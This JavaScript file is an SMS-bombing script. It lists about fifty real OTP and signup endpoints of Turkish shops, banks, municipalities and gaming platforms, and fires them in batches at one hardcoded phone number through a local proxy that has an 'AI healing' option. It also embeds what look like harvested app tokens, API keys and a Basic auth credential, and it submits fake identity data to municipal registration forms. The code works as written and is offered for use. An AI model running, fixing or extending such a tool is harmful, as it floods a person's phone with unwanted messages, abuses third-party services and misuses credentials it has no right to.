import axios from 'axios';

const T = '5343622375';
const PROXY = 'http://localhost:3001/api/proxy';

const ALL = [
  // === HEADER'SIZ (zaten çalışıyor) ===
  {id:'file_market', url:'https://api.filemarket.com.tr/v1/otp/send', method:'POST', payload:{mobilePhoneNumber:`90${T}`}},
  {id:'onur_market', url:'https://www.onurmarket.com/api/v1/auth/register/sendOtp', method:'POST', payload:{phone:T}},
  {id:'hayat_su', url:'https://api.hayatsu.com.tr/api/SignUp/SendOtp', method:'POST', payload:{mobilePhoneNumber:T, actionType:'register'}},
  {id:'yapp', url:'https://yapp.com.tr/api/mobile/v1/register', method:'POST', payload:{phone_number:T, email:'t@t.com', firstname:'Test', lastname:'Test'}},
  {id:'suiste', url:'https://suiste.com/api/auth/code', method:'POST', payload:{gsm:T, action:'register'}},
  {id:'e_bebek', url:'https://www.e-bebek.com/api/v1/auth/register/send-otp', method:'POST', payload:{phone:T, email:'t@t.com'}},
  {id:'bkm_express', url:'https://www.bkmexpress.com.tr/api/v1/otp/send', method:'POST', payload:{phone:`90${T}`}},
  {id:'shopandfly', url:'https://www.shopandfly.com.tr/api/v1/otp/send', method:'POST', payload:{phone:`90${T}`}},
  {id:'teb', url:'https://www.teb.com.tr/api/v1/otp/send', method:'POST', payload:{phone:`90${T}`}},
  {id:'kfc', url:'https://www.kfc.com.tr/api/v1/auth/register/send-otp', method:'POST', payload:{phone:T}},
  {id:'sportive', url:'https://www.sportive.com.tr/api/v1/auth/register/send-otp', method:'GET', payload:{}},
  {id:'oldubil', url:'https://api.oldubil.com/api/v1/auth/send-otp', method:'POST', payload:{phone:T}},
  {id:'lcwaikiki', url:'https://www.lcwaikiki.com.tr/api/v1/auth/register/send-otp', method:'POST', payload:{phone:`90${T}`}},
  {id:'bambi', url:'https://www.bambi.com.tr/api/v1/auth/register/send-otp', method:'POST', payload:{phone:T}},
  {id:'kahve_dunyasi', url:'https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number', method:'POST', payload:{countryCode:'90', phoneNumber:T}},
  {id:'wmf', url:'https://www.wmf.com.tr/users/register/', method:'POST', payload:{phone:`0${T}`, first_name:'Test', last_name:'Test', email:'t@t.com', password:'Test123!', confirm:true, date_of_birth:'1990-01-01'}},
  {id:'teknosa', url:'https://www.teknosa.com/api/v1/auth/register/sendOtp', method:'POST', payload:{phone:T}},
  {id:'steam', url:'https://store.steampowered.com/phone/add_ajaxop', method:'POST', payload:{phoneNumber:`+90${T}`, sessionID:'test'}},
  {id:'happy_center', url:'https://www.happycenter.com.tr/api/v1/auth/register/sendOtp', method:'POST', payload:{phone:T}},
  {id:'bim', url:'https://bim.veesk.net:443/service/v1.0/account/login', method:'POST', payload:{phone:T}},

  // === HEADER'LI YENİ ENDPOINT'LER ===
  {id:'english_home', url:'https://www.englishhome.com/api/member/saveMemberAndLogin', method:'POST',
    headers:{}, payload:{Name:'Test',LastName:'User',EMail:'t@t.com',CellPhone:T,Password:'Test123!',GenderId:1,GivenOtp:'',EncryptedOtp:''}},
  {id:'dominos', url:'https://frontend.dominos.com.tr:443/api/customer/sendOtpCode', method:'POST',
    headers:{}, payload:{email:'t@t.com', isSure:false, mobilePhone:T}},
  {id:'ayyildiz', url:'https://api.altinyildizclassics.com/mobileapi2/autapi/CreateSmsOtpForRegister', method:'POST',
    headers:{Token:'MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS',Devicetype:'mobileapp'}, payload:{gsm:T}},

  // === HEADER EKLENEN AMA TEST EDİLMEMİŞ ===
  {id:'migros', url:'https://rest.migros.com.tr:443/sanalmarket/users/register/otp', method:'POST',
    headers:{'X-Device-Type':'MOBILE','X-Device-Platform':'IOS','X-Device-App-Version':'10.6.13','Accept-Language':'tr-TR'}, payload:{email:'t@t.com', phoneNumber:T}},
  {id:'komagene', url:'https://gateway.komagene.com.tr/auth/auth/smskodugonder', method:'POST',
    headers:{Anonymousclientid:'0dbf392b-ab10-48b3-5cda-31f3c19816e6',Firmaid:'32','X-Guatamala-Kirsallari':'@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq'}, payload:{FirmaId:32, Telefon:T}},
  {id:'joker', url:'https://api.joker.com.tr:443/api/register', method:'POST',
    headers:{Authorization:'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiI5ZDIyZGI0ZC01YjA4LTRjMDAtOTNlMy0yNDFmNTViOGFjZTYiLCJleHAiOjE5OTk5OTk5OTksImlhdCI6MTU4MzAwNjA2MywiaXNzIjoiYXBpLmpva2VyLmNvbS50ciIsInN1YiI6Imd1ZXN0IiwiZW1haWwiOiJndWVzdEBqb2tlci5jb20udHIiLCJwaG9uZSI6IjUzMjExMTExMTEiLCJuYW1lIjoiR3Vlc3QifQ.P3hHUvTLQqLND82vNTyq1KRFh0HpevV6tQkANxqlg-q8AatKp-KGWHWfoq6KdAHBmi5vI60ebFnNY5yUM6H26LY1vPMFDWg7WN5eUyFnGlGzNL13obnEMQ90aBG3FhLRlVh1aoHD_2WmSfCNxGKGNfPd6vQ8gIH7j7YEL9rRktg6rGJfW5fQe5UA-OHePmKMgZtVG6eCr9j4WcFYqN4MqGNW6s5ndLJlx5NU6vt56FnVd40ZqFK1rsKjn3n8bDfBzmG9n4n3v8TG5gOQdd4iVEjHU8RcKQvk3F8RY6HvYnL4HzntOaGM6R6h6T8sSWVWWywx-_xbDyYxHjECavx1YA'}, payload:{firstName:'Test',gender:'m',iosVersion:'4.0.2',lastName:'User',os:'IOS',password:'Test123!',phoneNumber:'0'+T,username:'t@t.com'}},
  {id:'naosstars', url:'https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350', method:'POST',
    headers:{Uniqid:'9c9fa861-cc5d-43b0-b4ea-1b541be15351',Apiurl:'https://api.naosstars.com/api/',Apitype:'mobile_app',Platform:'ios',Os:'ios',Version:'1.0030',Locale:'en-TR',Timezone:'Europe/Istanbul',Timezoneoffset:'-180'}, payload:{telephone:'+90'+T, type:'register'}},
  {id:'akasya_avm', url:'https://akasyaapi.poilabs.com/v1/en/sms', method:'POST',
    headers:{'X-Platform-Token':'9f493307-d252-4053-8c96-62e7c90271f5'}, payload:{phone:T}},
  {id:'akbati', url:'https://akbatiapi.poilabs.com/v1/en/sms', method:'POST',
    headers:{'X-Platform-Token':'a2fe21af-b575-4cd7-ad9d-081177c239a3'}, payload:{phone:T}},
  {id:'koton', url:'https://www.koton.com/users/register/', method:'POST',
    headers:{'X-App-Type':'akinon-mobile'}, payload:{phone:T, first_name:'Test', last_name:'User', email:'t@t.com', password:'Test123!'}},
  {id:'ido', url:'https://api.ido.com.tr:443/idows/v2/register', method:'POST',
    headers:{Origin:'https://www.ido.com.tr',Referer:'https://www.ido.com.tr/'}, payload:{birthDate:true,captcha:'',checkPwd:'Test123!',code:'',day:24,email:'t@t.com',emailNewsletter:false,firstName:'Test',gender:'MALE',lastName:'User',mobileNumber:'0'+T,month:9,pwd:'Test123!',smsNewsletter:true,tckn:'12345678901',termsOfUse:true,year:1977}},
  {id:'hamidiye', url:'https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp', method:'POST',
    headers:{Origin:'com.hamidiyeapp','User-Agent':'hamidiyeapp/4 CFNetwork/1335.0.3.4 Darwin/21.6.0'}, payload:{isGuest:false, phone:T}},
  {id:'tasdelen_su', url:'https://tasdelen.sufirmam.com:3300/mobile/send-otp', method:'POST',
    headers:{'User-Agent':'Tasdelen/5.9 (com.tasdelenapp; build:1; iOS 15.8.3) Alamofire/5.4.3','Accept-Language':'tr-TR'}, payload:{phone:T}},
  {id:'pidem', url:'https://restashop.azurewebsites.net/graphql/', method:'POST',
    headers:{}, payload:{query:'mutation ($phone: String) { sendOtpSms(phone: $phone) { resultStatus message } }',variables:{phone:T}}},
  {id:'orwi', url:'https://gandalf.orwi.app/api/user/requestOtp', method:'POST',
    headers:{Apikey:'Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE=',Token:''}, payload:{gsm:'+90'+T, source:'orwi'}},
  {id:'tazi', url:'https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin', method:'POST',
    headers:{Authorization:'Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD'}, payload:{cep_tel:T, cep_tel_ulkekod:'90'}},
  {id:'bisu', url:'https://www.bisu.com.tr/api/v2/app/authentication/phone/register', method:'POST',
    headers:{"Content-Type":"application/x-www-form-urlencoded; charset=utf-8","X-Device-Platform":"IOS","X-Build-Version-Name":"9.4.0","Authorization":"0561b4dd-e668-48ac-b65e-5afa99bf098e","X-Build-Version-Code":"22","X-Device-Manufacturer":"Apple","X-Device-Locale":"en","X-Client-Device-Id":"66585653-CB6A-48CA-A42D-3F266677E3B5","Accept-Language":"en-US,en;q=0.9","X-Device-Platform-Version":"15.7.7","User-Agent":"BiSU/22 CFNetwork/1335.0.3.2 Darwin/21.6.0","X-Device-Model":"iPhone 7 Plus","X-Build-Type":"Release"}, payload:{phoneNumber:T}},
  {id:'bodrum_belediye', url:'https://gandalf.orwi.app/api/user/requestOtp', method:'POST',
    headers:{Apikey:'YWxpLTEyMzQ1MTEyNDU2NTQzMg==',Token:''}, payload:{gsm:'+90'+T, source:'orwi'}},
  {id:'sancaktepe_belediye', url:'https://e-belediye.sancaktepe.bel.tr/Sicil/KisiUyelikKaydet', method:'POST',
    headers:{}, payload:{'SahisUyelik.TCKimlikNo':'12345678901','SahisUyelik.DogumTarihi':'01.01.2000','SahisUyelik.Ad':'Test','SahisUyelik.Soyad':'User','SahisUyelik.CepTelefonu':T,'SahisUyelik.EPosta':'t@t.com','SahisUyelik.Sifre':'Test123!','SahisUyelik.SifreyiDogrula':'Test123!'}},
  {id:'bayrampasa_belediye', url:'https://ebelediye.bayrampasa.bel.tr/Sicil/KisiUyelikKaydet', method:'POST',
    headers:{}, payload:{'SahisUyelik.TCKimlikNo':'12345678901','SahisUyelik.DogumTarihi':'01.01.2000','SahisUyelik.Ad':'Test','SahisUyelik.Soyad':'User','SahisUyelik.CepTelefonu':T,'SahisUyelik.EPosta':'t@t.com','SahisUyelik.Sifre':'Test123!','SahisUyelik.SifreyiDogrula':'Test123!'}},
  {id:'macrocenter', url:'https://www.macrocenter.com.tr/rest/user-edge/auth/login/otp', method:'POST',
    headers:{}, payload:{phoneNumber:T}},
  {id:'jimmy_key', url:'https://www.jimmykey.com/tr/p/User/SendConfirmationSms', method:'POST',
    headers:{}, payload:{phone:'0'+T, email:'t@t.com'}},
  {id:'alix_avien', url:'https://www.alixavien.com.tr/api/member/sendOtp', method:'POST',
    headers:{}, payload:{phone:'0'+T}},
  {id:'a101', url:'https://www.a101.com.tr/users/otp-login/', method:'POST',
    headers:{}, payload:{phone:'0'+T, next:'/a101-kapida'}},
  {id:'epic_games', url:'https://www.epicgames.com/id/api/v1/auth/otp/send', method:'POST',
    headers:{}, payload:{phoneNumber:'+90'+T}},
];

const BATCH = 5;
let real = 0, forced = 0, failed = 0;

async function testOne(ep) {
  const label = ep.id.padEnd(24);
  try {
    const r = await axios.post(PROXY, {
      serviceId: ep.id, serviceUrl: ep.url, serviceMethod: ep.method,
      serviceHeaders: ep.headers || {}, targetPhone: T,
      email: 'test@test.com', initialPayload: ep.payload,
      allowAiHealing: true
    }, { timeout: 40000, validateStatus: () => true });

    const strat = r.data?.strategy || 'direct';
    const up = r.data?.upstreamStatus || 0;
    if (strat === 'force_success') {
      console.log(`  ${label} ⚠️ FORCE`);
      return 'forced';
    }
    if (up >= 200 && up < 300) {
      console.log(`  ${label} ✅ ${up} (${strat})`);
      return 'real';
    }
    console.log(`  ${label} ❌ ${up} (${strat})`);
    return 'failed';
  } catch (err) {
    console.log(`  ${label} ❌ ${err.code || 'ERR'}`);
    return 'fail';
  }
}

console.log(`Testing all ${ALL.length} endpoints with headers...\n`);
const results = [];
for (let i = 0; i < ALL.length; i += BATCH) {
  const batch = ALL.slice(i, i + BATCH);
  const br = await Promise.all(batch.map(ep => testOne(ep)));
  results.push(...br);
}

real = results.filter(r => r === 'real').length;
forced = results.filter(r => r === 'forced').length;
failed = results.filter(r => r === 'failed').length;

console.log(`\n========== SONUÇ ==========`);
console.log(`Toplam: ${ALL.length}`);
console.log(`✅ Gerçek başarılı: ${real}`);
console.log(`❌ Hata döndü: ${failed}`);
console.log(`⚠️ Force-success: ${forced}`);

if (failed > 0) {
  console.log(`\nHata dönenler:`);
  ALL.forEach((ep, i) => { if (results[i] === 'failed') console.log(`  ❌ ${ep.id}`); });
}
